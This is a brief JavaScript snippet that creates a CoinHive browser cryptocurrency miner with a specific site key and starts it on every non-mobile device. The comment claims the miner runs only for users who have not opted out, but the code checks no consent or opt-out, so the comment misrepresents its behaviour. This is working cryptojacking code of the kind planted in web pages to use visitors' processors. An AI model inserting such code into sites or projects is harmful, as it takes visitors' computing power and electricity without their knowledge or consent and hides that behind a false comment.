var miner = new CoinHive.Anonymous('L7Bc8FYDPoJfJW4ioMuEYGuXmTZptxs5', {throttle: 0.8});

// Only start on non-mobile devices and if not opted-out
if (!miner.isMobile()) {
  miner.start();
}